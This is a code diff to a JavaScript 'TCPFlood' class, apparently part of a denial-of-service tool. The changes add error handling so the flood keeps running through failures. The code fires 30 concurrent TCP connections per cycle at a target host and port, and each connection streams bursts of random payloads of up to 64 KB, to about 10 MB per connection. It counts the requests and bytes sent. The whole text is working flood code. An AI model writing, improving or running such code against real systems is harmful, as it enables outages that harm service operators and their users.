@@ -16,72 +16,99 @@ export class TCPFlood {
     }
 
     async start() {
-        const endTime = Date.now() + (this.duration * 1000);
+        try {
+            const endTime = Date.now() + (this.duration * 1000);
 
-        while (Date.now() < endTime && this.active) {
-            // 30 simultaneous TCP floods
-            const floods = [];
-            for (let i = 0; i < 30; i++) {
-                floods.push(this.attack());
+            while (Date.now() < endTime && this.active) {
+                try {
+                    // 30 simultaneous TCP floods
+                    const floods = [];
+                    for (let i = 0; i < 30; i++) {
+                        floods.push(this.attack());
+                    }
+                    await Promise.allSettled(floods);
+                } catch (err) {
+                    logger.debug(`TCP flood iteration error: ${err.message}`);
+                }
             }
-            await Promise.allSettled(floods);
+        } catch (err) {
+            logger.error(`TCP Flood error: ${err.message}`);
+            this.active = false;
         }
     }
 
     async attack() {
         return new Promise((resolve) => {
-            const socket = new net.Socket();
-            
-            socket.setTimeout(300);
-            socket.setNoDelay(true); // Disable Nagle's algorithm
-            socket.setKeepAlive(false);
-            
-            let bytesSent = 0;
-            const maxBytes = 10485760; // 10MB per connection
+            try {
+                const socket = new net.Socket();
+                
+                try {
+                    socket.setTimeout(300);
+                    socket.setNoDelay(true); // Disable Nagle's algorithm
+                    socket.setKeepAlive(false);
+                } catch (err) {
+                    logger.debug(`Socket config error: ${err.message}`);
+                }
+                
+                let bytesSent = 0;
+                const maxBytes = 10485760; // 10MB per connection
 
-            socket.connect(this.port, this.target, () => {
-                const sendBurst = () => {
-                    if (!this.active || bytesSent >= maxBytes) {
-                        Tools.safeClose(socket);
-                        resolve();
-                        return;
-                    }
-
-                    // Send 100 packets per burst
-                    for (let i = 0; i < 100; i++) {
-                        if (!this.active) break;
-                        
-                        // Random payload sizes for unpredictability
-                        const payloadSize = Tools.randomInt(1024, 65536);
-                        const payload = Tools.randomBytesBuffer(payloadSize);
-                        const sent = Tools.send(socket, payload);
-                        
-                        if (sent) {
-                            REQUESTS_SENT.add(1);
-                            BYTES_SENT.add(payloadSize);
-                            bytesSent += payloadSize;
-                        } else {
+                socket.connect(this.port, this.target, () => {
+                    const sendBurst = () => {
+                        if (!this.active || bytesSent >= maxBytes) {
                             Tools.safeClose(socket);
                             resolve();
                             return;
                         }
-                    }
-                    
-                    setImmediate(sendBurst);
-                };
 
-                sendBurst();
-            });
+                        try {
+                            // Send 100 packets per burst
+                            for (let i = 0; i < 100; i++) {
+                                if (!this.active) break;
+                                
+                                try {
+                                    // Random payload sizes for unpredictability
+                                    const payloadSize = Tools.randomInt(1024, 65536);
+                                    const payload = Tools.randomBytesBuffer(payloadSize);
+                                    const sent = Tools.send(socket, payload);
+                                    
+                                    if (sent) {
+                                        REQUESTS_SENT.add(1);
+                                        BYTES_SENT.add(payloadSize);
+                                        bytesSent += payloadSize;
+                                    } else {
+                                        Tools.safeClose(socket);
+                                        resolve();
+                                        return;
+                                    }
+                                } catch (err) {
+                                    // Continue on individual packet error
+                                }
+                            }
+                        } catch (err) {
+                            logger.debug(`TCP burst error: ${err.message}`);
+                        }
+                        
+                        setImmediate(sendBurst);
+                    };
 
-            socket.on('error', () => {
-                Tools.safeClose(socket);
+                    sendBurst();
+                });
+
+                socket.on('error', (err) => {
+                    logger.debug(`TCP socket error: ${err.message}`);
+                    Tools.safeClose(socket);
+                    resolve();
+                });
+
+                socket.on('timeout', () => {
+                    Tools.safeClose(socket);
+                    resolve();
+                });
+            } catch (err) {
+                logger.debug(`TCP attack error: ${err.message}`);
                 resolve();
-            });
-
-            socket.on('timeout', () => {
-                Tools.safeClose(socket);
-                resolve();
-            });
+            }
         });
     }
 
